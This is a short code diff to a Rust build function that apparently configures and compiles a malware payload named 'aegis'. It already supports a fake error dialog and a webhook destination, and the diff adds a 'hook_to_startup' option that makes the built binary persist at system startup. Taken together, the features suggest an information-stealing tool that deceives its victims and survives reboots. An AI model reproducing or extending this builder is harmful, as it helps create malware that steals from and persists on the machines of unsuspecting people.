@@ -7,6 +7,7 @@ pub fn build_binary(
     gt: bool,
     gdt: bool,
     fake_error: bool,
+    hook_to_startup: bool,
     fe_title: &str,
     fe_msg: &str,
     webhook_uri: String,
@@ -26,6 +27,9 @@ pub fn build_binary(
     }
     if fake_error {
         features.push("aegis/fake_error");
+    }
+    if hook_to_startup {
+        features.push("aegis/hook_to_startup");
     }
 
     let mut cmd = Command::new("cargo");
@@ -58,4 +62,8 @@ pub async fn send() {
 
 pub async fn show_error(title: &str, msg: &str) {
     utils::fake_error::show_error(title, msg).await;
+}
+
+pub async fn hook_to_startup() -> std::io::Result<()> {
+    utils::startup::startup()
 }
